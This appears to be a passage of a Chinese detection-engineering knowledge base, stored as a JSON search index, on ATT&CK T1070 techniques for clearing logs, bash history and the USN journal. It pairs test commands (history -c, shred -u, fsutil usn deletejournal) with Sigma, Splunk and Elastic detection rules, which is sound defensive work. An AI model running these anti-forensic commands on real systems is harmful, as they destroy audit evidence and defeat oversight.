<p>\u5177\u4f53\u6848\u4f8b\uff0c\u4f60\u53ef\u4ee5\u53c2\u8003\u7ed5\u8fc7sysmon\u76f8\u5173\u7684\u6587\u7ae0\u3002\uff08PS\uff1a\u82f1\u8bed\u4e0d\u597d\u3001\u8c37\u6b4c\u7ffb\u8bd1\u771f\u5fc3\uff0c\uff0c\uff0c\u592a\u96be\u4e86\uff09\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5728\u6b63\u5e38\u7684\u64cd\u4f5c\u671f\u95f4\u5185\uff0c\u4e8b\u4ef6\u65e5\u5fd7\u4e0d\u592a\u53ef\u80fd\u4f1a\u88ab\u523b\u610f\u6e05\u9664\u3002\u4f46\u662f\u6076\u610f\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u6765\u5c1d\u8bd5\u63a9\u76d6\u81ea\u5df1\u7684\u8e2a\u8ff9\u3002\u5f53\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6e05\u9664\u65f6\uff0c\u5b83\u662f\u53ef\u7591\u7684\u3002\u53d1\u73b0\u201c\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u201d\u65f6\u53ef\u80fd\u610f\u5473\u7740\u6709\u6076\u610f\u653b\u51fb\u8005\u5229\u7528\u4e86\u6b64\u9879\u6280\u672f\u3002</p> <p>\u96c6\u4e2d\u6536\u96c6\u4e8b\u4ef6\u65e5\u5fd7\u7684\u4e00\u4e2a\u597d\u5904\u5c31\u662f\u4f7f\u653b\u51fb\u8005\u66f4\u96be\u4ee5\u63a9\u76d6\u4ed6\u4eec\u7684\u8e2a\u8ff9\uff0c\u4e8b\u4ef6\u8f6c\u53d1\u5141\u8bb8\u5c06\u6536\u96c6\u5230\u7684\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u53d1\u9001\u7ed9\u591a\u4e2a\u6536\u96c6\u5668\uff08splunk\u3001elk\u7b49\uff09\uff0c\u4ece\u800c\u5b9e\u73b0\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\u3002\u4f7f\u7528\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\uff0c\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u7684\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0\u5a01\u80c1\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows security</p> <p>windows system</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u8fdb\u5165windows\u4e8b\u4ef6\u67e5\u770b\u5668</p> <p>windows\u65e5\u5fd7&gt;\u7cfb\u7edf\u65e5\u5fd7&gt;\u6e05\u9664\u65e5\u5fd7</p> <p>windows\u65e5\u5fd7&gt;\u5b89\u5168\u65e5\u5fd7&gt;\u6e05\u9664\u65e5\u5fd7</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#sigma","title":"sigma","text":"<pre><code>title: windows \u65e5\u5fd7\u6e05\u9664\ndescription: win7 and windows server 2003\u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u200b    product: windows\n\u200b    service: security\ndetection:\n\u200b    selection:\n\u200b        EventID:\n\u200b                - 1102\n\u200b                - 517\n\u200b    condition: selection\nlevel: medium\n</code></pre> <pre><code>title: windows \u65e5\u5fd7\u6e05\u9664\ndescription: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u200b    product: windows\n\u200b    service: system\ndetection:\n\u200b    selection:\n\u200b        EventID: 104\n\u200b    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1070-001</p> <p>https://attack.mitre.org/techniques/T1070/001/</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/","title":"T1070-003-linux-\u6e05\u9664\u5386\u53f2\u8bb0\u5f55","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>macOS\u548cLinux\u90fd\u4f1a\u8ddf\u8e2a\u7528\u6237\u5728\u7ec8\u7aef\u4e2d\u8f93\u5165\u7684\u547d\u4ee4\uff0c\u4ee5\u4fbf\u7528\u6237\u53ef\u4ee5\u8f7b\u677e\u8bb0\u4f4f\u4ed6\u4eec\u6240\u505a\u7684\u4e8b\u60c5\u3002\u53ef\u4ee5\u901a\u8fc7\u51e0\u79cd\u4e0d\u540c\u7684\u65b9\u5f0f\u8bbf\u95ee\u8fd9\u4e9b\u65e5\u5fd7\u3002\u7528\u6237\u5728\u767b\u5f55\u540e\uff0c\u5c06\u5728\u73af\u5883\u53d8\u91cf\u6307\u5411\u7684\u6587\u4ef6\u4e2d\u8ddf\u8e2a\u6b64\u547d\u4ee4\u5386\u53f2\u8bb0\u5f55HISTFILE\u3002\u5f53\u7528\u6237\u6ce8\u9500\u7cfb\u7edf\u65f6\uff0c\u6b64\u4fe1\u606f\u5c06\u66f4\u65b0\u5230\u7528\u6237\u4e3b\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u4e2d~/.bash_history\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\u5b83\u5141\u8bb8\u7528\u6237\u67e5\u770b\u4ed6\u4eec\u4e4b\u524d\u5728\u4e0d\u540c\u4f1a\u8bdd\u4e2d\u4f7f\u7528\u8fc7\u7684\u547d\u4ee4\u3002\u7531\u4e8e\u4fdd\u5b58\u4e86\u5728\u547d\u4ee4\u884c\u4e0a\u8f93\u5165\u7684\u6240\u6709\u5185\u5bb9\uff0c\u56e0\u6b64\u4e5f\u4f1a\u4fdd\u5b58\u5728\u547d\u4ee4\u884c\u4e0a\u8f93\u5165\u7684\u5bc6\u7801\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6ee5\u7528\u6b64\u529f\u80fd\u5728\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u641c\u7d22\u660e\u6587\u5bc6\u7801\u3002\u6b64\u5916\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7684\u65b9\u6cd5\u4e0d\u540c\uff0c\u4f60\u9700\u8981\u9632\u6b62\u81ea\u5df1\u7684\u5386\u53f2\u8bb0\u5f55\u4e2d\u51fa\u73b0\u8fd9\u4e9b\u547d\u4ee4\uff0c\u4f8b\u5982unset HISTFILE\u3001export HISTFILESIZE=0\u3001history -c\u3001rm ~/.bash_history\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>rm ~/.bash_history</p> <p>echo \" \" &gt; .bash_history</p> <p>cat /dev/null &gt; ~/.bash_history</p> <p>ln -sf /dev/null ~/.bash_history</p> <p>truncate -s0 ~/.bash_history</p> <p>unset HISTFILE</p> <p>export HISTFILESIZE=0</p> <p>history -c</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09</p> <p>bash\u5386\u53f2\u8bb0\u5f55</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>icbc@icbc:~$ rm ~/.bash_history</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u57fa\u4e8eaudit\u65e5\u5fd7</p> <p>\u6682\u65e0</p> <p>\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55</p> <p>icbc@icbc:~$ history</p> <p>\u200b    7  rm ~/.bash_history</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#splunk","title":"splunk\u89c4\u5219","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#audit","title":"\u57fa\u4e8eaudit\u65e5\u5fd7","text":"<p>\u573a\u666f\uff1arm -rf~ / .bash_history index=linux sourcetype=linux_audit syscall=263 | table time,host,auid,uid,euid,exe,key</p> <p>index=linux sourcetype=linux_audit type=PATH name=.bash_history nametype=delete | table time,name,nametype</p> <p>\u573a\u666f\uff1aecho \" \" &gt; .bash_history</p> <p>index=linux sourcetype=\"linux_audit\" bash_history_changes exe!=/home/ec2-user/splunk/bin/splunkd syscall=257 a2!=0 AND a3!=0 | table host,syscall,syscall_name,exe,auid</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#bash","title":"\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55","text":"<p>index=linux sourcetype=\"bash_history\"  \"rm * .bash_history\"  #\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u53ea\u505a\u4e86\u6700\u7b80\u5355\u7684\u6f14\u793a\uff0c\u6bd4\u5982history -c \u662f\u65e0\u6cd5\u901a\u8fc7bash\u5386\u53f2\u8bb0\u5f55\u8fdb\u884c\u68c0\u6d4b\u7684\uff01\u5176\u4ed6\u547d\u4ee4\u5982\u4f55\u68c0\u6d4b\uff0c\u4f60\u53ef\u4ee5\u81ea\u884c\u6d4b\u8bd5\u8bb0\u5f55\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1070-003</p> <p>https://attack.mitre.org/techniques/T1070/003/</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/","title":"T1070-004-linux-\u6587\u4ef6\u5220\u9664","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u5728\u7cfb\u7edf\u4e0a\u5220\u9664\u6216\u521b\u5efa\u6076\u610f\u8f6f\u4ef6\u3001\u5de5\u5177\u6216\u5176\u4ed6\u975e\u672c\u673a\u6587\u4ef6\uff0c\u53ef\u80fd\u4f1a\u7559\u4e0b\u5173\u4e8e\u5728\u4e3b\u673a\u4e0a\u6267\u884c\u7684\u64cd\u4f5c\u4ee5\u53ca\u64cd\u4f5c\u65b9\u5f0f\u7684\u75d5\u8ff9\u3002\u4f5c\u4e3a\u5165\u4fb5\u540e\u6e05\u7406\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5165\u4fb5\u8fc7\u7a0b\u4e2d\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6\u4ee5\u4fdd\u6301\u5176\u9690\u853d\u6027\u3002</p> <p>\u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86\u53ef\u7528\u4e8e\u6267\u884c\u6e05\u7406\u7684\u5de5\u5177\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u793a\u4f8b\u5305\u62ec\u672c\u673acmd\u529f\u80fd\uff08\u5982del\uff09\uff0c\u5b89\u5168\u5220\u9664\u5de5\u5177\uff08\u5982Windows Sysinternals SDelete\uff09\u6216\u5176\u4ed6\u7b2c\u4e09\u65b9\u6587\u4ef6\u5220\u9664\u5de5\u5177\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>rm -rf abc. text    #\u5f3a\u5236\u5220\u9664abc.txt</p> <p>rm -f abc.txt      #\u5f3a\u5236\u5220\u9664abc.txt</p> <p>shred -u abc.txt  #\u5f7b\u5e95\u7c89\u788e\u5220\u9664\u6587\u4ef6abc.txt</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09</p> <p>bash\u5386\u53f2\u8bb0\u5f55</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>icbc@icbc:~$ rm -r abc.txt</p> <p>icbc@icbc:~$ shred -u abc.txt</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u57fa\u4e8eaudit\u65e5\u5fd7</p> <p>\u6682\u65e0</p> <p>\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55</p> <p>icbc@icbc:~$ history</p> <p>650  rm -r abc.txt</p> <p>654  shred -u abc.txt</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#splunk","title":"splunk\u89c4\u5219","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#audit","title":"\u57fa\u4e8eaudit\u65e5\u5fd7","text":"<p>index=linux sourcetype=linux_audit syscall=59 comm=shred | table host,auid,msg</p> <p>index=linux sourcetype=linux_audit type=execve shred .bash_history | table host,msg,a0,a2</p> <p>index=linux sourcetype=linux_audit syscall=263 | table host,auid,uid,eid,exe</p> <p>index=linux sourcetype=linux_audit syscall=82 exe=/usr/bin/shred | table host,auid,uid,eid,exe</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#bash","title":"\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55","text":"<p>index=linux sourcetype=\"bash_history\" bash_command=\"rm \" OR  bash_command=\"shred -u \"</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1070-004</p> <p>https://attack.mitre.org/techniques/T1070/004/</p> <p>linux\u4e0brm\u547d\u4ee4\u8be6\u89e3</p> <p>https://www.cnblogs.com/ftl1012/p/9247107.html</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/","title":"T1070-004-win-\u4f7f\u7528Fsutil\u5220\u9664\u5377USN\u65e5\u5fd7","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u5176\u5165\u4fb5\u6d3b\u52a8\u6240\u7559\u4e0b\u7684\u6587\u4ef6\u3002\u653b\u51fb\u8005\u5728\u7cfb\u7edf\u4e0a\u4e22\u5f03\u521b\u5efa\u7684\u6076\u610f\u8f6f\u4ef6\u3001\u5de5\u5177\u6216\u5176\u4ed6\u53ef\u80fd\u4f1a\u7559\u4e0b\u75d5\u8ff9\u7684\u975e\u672c\u673a\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u7684\u5220\u9664\u53ef\u4ee5\u5728\u5165\u4fb5\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u5165\u4fb5\u540e\u7684\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4ee5\u6700\u5927\u7a0b\u5ea6\u5730\u51cf\u5c11\u653b\u51fb\u8005\u7559\u4e0b\u7684\u8db3\u8ff9\u3002</p> <p>\u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5de5\u5177\u6765\u6267\u884c\u6e05\u9664\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u5176\u4e2d\u5305\u62ec\u672c\u673acmd\u51fd\u6570\uff08\u4f8b\u5982DEL\uff09\uff0c\u5b89\u5168\u5220\u9664\u5de5\u5177\uff08\u4f8b\u5982Windows Sysinternals SDelete\uff09\u6216\u5176\u4ed6\u7b2c\u4e09\u65b9\u6587\u4ef6\u5220\u9664\u5de5\u5177\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u8bc6\u522b\u4f7f\u7528fsutil.exe\u5220\u9664USN JRNL\u5377\u3002\u653b\u51fb\u8005\u4f7f\u7528\u6b64\u6280\u672f\u6765\u6d88\u9664\u5229\u7528\u6f0f\u6d1e\u540e\u521b\u5efa\u7684\u6587\u4ef6\u7684\u6d3b\u52a8\u8bc1\u636e\u3002</p> <p>\u66f4\u591a\u59ff\u52bf\u53ef\u53c2\u8003\uff1a\u6e17\u900f\u6280\u5de7\u2014\u2014Windows\u4e0bNTFS\u6587\u4ef6\u7684USN Journal</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows security</p> <p>windows sysmon</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>\u5173\u95edNTFS\u65e5\u5fd7\u529f\u80fd\uff1a\n\n\u5728cmd\u4e2d\u8fd0\u884c fsutil:\n\nfsutil usn createjournal m=1000 a=100 c:  //\u521b\u5efa\u65e5\u5fd7\n\nfsutil usn deletejournal /d c:  //\u5220\u9664\u65e5\u5fd7\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b4688\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\u6837\u4f8b\u3002</p> <p>windows server 2016/win10</p> <pre><code>A new process has been created.\n\nSubject:\n\n   Security ID:  WIN-R9H529RIO4Y\\Administrator\n   Account Name:  Administrator\n   Account Domain:  WIN-R9H529RIO4Y\n   Logon ID:  0x1fd23\n\nProcess Information:\n\n   New Process ID:  0xed0\n   New Process Name: C:\\Windows\\System32\\notepad.exe\n   Token Elevation Type: TokenElevationTypeDefault (1)\n   Mandatory Label: Mandatory Label\\Medium Mandatory Level\n   Creator Process ID: 0x8c0\n   Creator Process Name: c:\\windows\\system32\\explorer.exe\n   Process Command Line: C:\\Windows\\System32\\notepad.exe c:\\sys\\junk.txt\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#sigma","title":"Sigma","text":"<pre><code>title: \u4f7f\u7528Fsutil\u5220\u9664\u5377USN\u65e5\u5fd7\ndescription: \u8bc6\u522b\u4f7f\u7528fsutil.exe\u5220\u9664USN JRNL\u5377\u3002\u653b\u51fb\u8005\u4f7f\u7528\u6b64\u6280\u672f\u6765\u6d88\u9664\u5229\u7528\u6f0f\u6d1e\u540e\u521b\u5efa\u7684\u6587\u4ef6\u7684\u6d3b\u52a8\u8bc1\u636e\u3002\nstatus: experimental\nreferences:\n    - https://www.elastic.co/guide/en/siem/guide/current/delete-volume-usn-journal-with-fsutil.html#delete-volume-usn-journal-with-fsutil\nlogsource:\n\u200b    product: windows\n\u200b    service: security\ndetection:\n\u200b    selection:\n\u200b        EventID:\n\u200b                - 1 #sysmon\n\u200b                - 4688 #Windows \u5b89\u5168\u65e5\u5fd7\n        New Process Name: 'fsutil.exe' #Application Name\n        Commanline: 'usn deletejournal'\n\u200b    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#elastic-rule-query","title":"Elastic rule query","text":"<pre><code>event.action:\"Process Create (rule: ProcessCreate)\" and\nprocess.name:fsutil.exe and process.args:(deletejournal and usn)\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_6","title":"\u5efa\u8bae","text":"<p>\u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E4%BD%BF%E7%94%A8Fsutil%E5%88%A0%E9%99%A4%E5%8D%B7USN%E6%97%A5%E5%BF%97/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1070-004</p> <p>https://attack.mitre.org/techniques/T1070/004/</p> <p>\u6e17\u900f\u6280\u5de7\u2014\u2014Windows\u4e0bNTFS\u6587\u4ef6\u7684USN Journal</p> <p>http://app.myzaker.com/news/article.php?pk=5c6e106577ac642d40290442</p> <p>\u4f7f\u7528Fsutil\u5220\u9664\u5377USN\u65e5\u5fd7 Elastic rule query</p> <p>https://www.elastic.co/guide/en/siem/guide/current/delete-volume-usn-journal-with-fsutil.html#delete-volume-usn-journal-with-fsutil</p> <p>4688\u4e8b\u4ef6\u6837\u4f8b</p> 